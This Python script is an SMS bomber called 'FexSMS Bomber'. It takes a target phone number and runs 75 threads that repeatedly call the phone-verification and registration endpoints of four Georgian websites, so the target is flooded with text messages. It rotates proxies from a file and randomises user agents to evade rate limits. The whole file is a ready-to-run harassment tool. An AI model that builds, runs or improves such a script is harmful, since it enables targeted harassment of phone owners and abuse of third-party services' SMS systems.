import requests
from user_agent import generate_user_agent
import random
import time
import string
import threading
import os

# --- UI & CONFIG ---
RED = "\033[1;31m"
RESET = "\033[0;0m"

# New FexSMS Logo with Bomb Icon
BANNER = f"""{RED}
  ______         _____ __  __  _____ ____                  _               
 |  ____|       / ____|  \/  |/ ____|  _ \                | |              
 | |__ _____  _| (___ | \  / | (___ | |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  __/ _ \ \/ /\___ \| |\/| |\___ \|  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | | |  __/>  < ____) | |  | |____) | |_) | (_) | | | | | | |_) |  __/ |   
 |_|  \___/_/\_\_____/|_|  |_|_____/|____/ \___/|_| |_| |_|_.__/ \___|_|   
{RESET}"""

def get_proxies():
    """Loads proxies from proxies.txt if available."""
    if os.path.exists("proxies.txt"):
        with open("proxies.txt", "r") as f:
            lines = [line.strip() for line in f if line.strip()]
            # Supports user:pass@ip:port or ip:port
            return [{"http": f"http://{p}", "https": f"http://{p}"} for p in lines]
    return []

PROXIES_LIST = get_proxies()

def get_request_args():
    """Generates request arguments with rotated proxies and fresh headers."""
    args = {
        "headers": {
            "User-Agent": generate_user_agent(),
            "Accept": "application/json, text/plain, */*",
            "Connection": "keep-alive"
        },
        "timeout": 8
    }
    if PROXIES_LIST:
        args["proxies"] = random.choice(PROXIES_LIST)
    return args

# --- API METHODS (Cleaned) ---

def agrohub(number):
    url = "https://api.agrohub.ge/v1/Account/user"
    return requests.post(url, json={"userName": f"995{number}"}, **get_request_args())

def extra(number):
    url = "https://identity.extra.ge/api/Account/register"
    payload = {"firstName":"FexUser","lastName":"FexUser","emailOrPhone":number,"contactStatus":True}
    return requests.post(url, json=payload, **get_request_args())

def qartveli(number):
    url = "https://www.qaraveli.ge/interactive.php"
    args = get_request_args()
    args["headers"]["Content-Type"] = "application/x-www-form-urlencoded"
    return requests.post(url, data=f"f=getPhoneCode&p={number}", **args)

def rsge(number):
    url = "https://videocall.rs.ge/WebServices/hsUser.ashx/ConfirmContact"
    return requests.post(url, json={"contact": number, "contactType": 0}, **get_request_args())

# --- ENGINE ---

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    if not PROXIES_LIST:
        print(f"[*] {RED}Warning:{RESET} No proxies.txt found. Using local IP.")
    else:
        print(f"[*] Proxy Pool: {len(PROXIES_LIST)} active proxies loaded.")

    target = input(f'{RED}[?]{RESET} Enter Target Number: ')
    threads = 75	 
    
    apis = [agrohub, qartveli, rsge, extra]

    def worker():
        while True:
            api = random.choice(apis)
            try:
                res = api(target)
                log_color = RED if res.status_code != 200 else ""
                print(f"[{time.strftime('%H:%M:%S')}] {api.__name__} -> {log_color}{res.status_code}{RESET}")
            except:
                pass
            time.sleep(0.4) # Slight delay to keep threads healthy

    print(f"[*] Detonating {threads} threads... Press CTRL+C to stop.")
    
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Bomber stopped.{RESET}")

if __name__ == "__main__":
    main()